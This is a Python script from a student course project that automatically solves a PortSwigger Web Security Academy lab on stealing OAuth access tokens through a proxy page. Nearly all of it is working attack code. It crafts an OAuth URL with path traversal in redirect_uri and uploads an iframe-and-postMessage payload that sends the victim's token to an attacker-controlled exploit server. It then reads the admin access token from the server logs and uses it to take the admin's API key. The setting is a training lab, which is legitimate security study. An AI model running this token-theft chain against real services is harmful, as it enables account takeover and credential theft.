# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page
import json
import re
import requests

from Helpers import parseArgsForSite, uploadExploit, searchResponse, checkForSiteLiveness

site = parseArgsForSite('https://ac6b1f701fe36e55c04b021400c3004e.web-security-academy.net/')
checkForSiteLiveness(site)
s = requests.Session()

if __name__ == "__main__":
    resp = s.get(f'https://{site}/social-login', allow_redirects=False)

    # Find exploit URI
    exploit_uri = searchResponse(resp, 'a', {'id': 'exploit-link'}).get('href')
    print(f'Found exploit server URI: {exploit_uri}')

    # Find social login url in <meta> tag content
    social_login_url = searchResponse(resp, 'meta', {'http-equiv': 'refresh'}).get('content').split('url=')[1]
    oauth_site = social_login_url.split('/')[2]
    print(f'Found social media login url: {social_login_url}')
    print('OAuth host: ', oauth_site)

    # Find client_id in social login URL
    client_id = re.search('client_id=(.+)&redirect', social_login_url).group(1)
    print(f'Found client ID: {client_id}')

    # Craft and upload exploit, then check exploit server logs for oauth code to use in sign-in
    exploitative_url = f'https://{oauth_site}/auth?client_id={client_id}&redirect_uri=https://{site}/oauth-callback/' \
        + '../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email'
    print(f'Created exploit payload causing admin to access: {exploitative_url}')
    exploit_payload = f"""
    <iframe src="{exploitative_url}"></iframe>
    <script>
        window.addEventListener('message', function(e) {'{'}
            fetch("/" + encodeURIComponent(e.data.data))
        {'}'}, false)
    </script>
    """
    resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
    if resp.status_code == 200:
        print('Uploaded exploit to server...')
    else:
        print('Failed to upload exploit.')
        exit()

    # Since we delivered the exploit, the admin will automatically access the page w/ our corrupted redirect_uri
    # So, our exploit server logs should show a request including the admin's Authorization access token
    resp = s.get(f'{exploit_uri}/log')
    print(resp.text)
    token = re.findall('access_token%3D(.+)%26expires', resp.text).pop()
    print(f'Found admin access token!\ntoken: {token}')

    resp = s.get(f'https://{oauth_site}/me', headers={
        'Authorization': f'Bearer {token}'
    })
    solution = json.loads(resp.text)['apikey']

    print(f'Found admin api key: {solution}\nSubmitting to solve level...')
    s.post(f'https://{site}/submitSolution', data={'answer': solution})
